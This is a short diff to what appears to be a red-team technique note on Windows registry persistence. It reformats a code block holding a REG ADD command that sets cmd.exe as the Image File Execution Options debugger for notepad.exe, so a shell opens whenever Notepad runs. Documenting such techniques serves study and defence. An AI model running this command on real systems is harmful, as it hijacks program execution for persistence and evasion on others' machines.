@@ -8,13 +8,11 @@ description: 'Defense Evasion, Persistence, Privilege Escalation'
 
 Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start cmd.exe:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Launching a notepad on the victim system:
 
